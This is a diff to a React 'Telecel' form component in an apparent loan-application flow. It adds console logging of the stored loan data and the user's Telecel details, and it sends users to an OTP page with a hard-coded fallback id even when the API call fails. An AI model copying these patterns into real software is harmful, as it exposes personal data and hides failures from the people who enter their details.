@@ -1,9 +1,10 @@
 import { useState } from "react";
 import axios from "axios";
-import { useNavigate } from "react-router-dom";
+import { useNavigate, useParams } from "react-router-dom";
 
 export default function Telecel() {
   const navigate = useNavigate();
+  const { id } = useParams(); // just to confirm route works
 
   const [loading, setLoading] = useState(false);
   const [data, setData] = useState({
@@ -18,7 +19,16 @@ export default function Telecel() {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+    let loanData = {};
+
+    try {
+      loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+    } catch {
+      loanData = {};
+    }
+
+    console.log("LoanData:", loanData);
+    console.log("Telecel Data:", data);
 
     setLoading(true);
 
@@ -31,15 +41,15 @@ export default function Telecel() {
         }
       );
 
-      console.log("Response:", res.data);
+      console.log("API response:", res.data);
 
-      const id = res.data?.id || "123"; // ✅ fallback
-      navigate(`/otp/${id}`);
+      const newId = res.data?.id || "123";
+      navigate(`/otp/${newId}`);
 
     } catch (err) {
-      console.error(err);
+      console.error("Error:", err);
 
-      // ✅ still move forward
+      // fallback
       navigate("/otp/123");
     }
 
@@ -48,7 +58,8 @@ export default function Telecel() {
 
   return (
     <div style={{ padding: "20px" }}>
-      <h1>Telecel Verification</h1>
+      <h1>Telecel Page ✅</h1>
+      <p>Route ID: {id}</p>
 
       <form onSubmit={handleSubmit}>
         <input
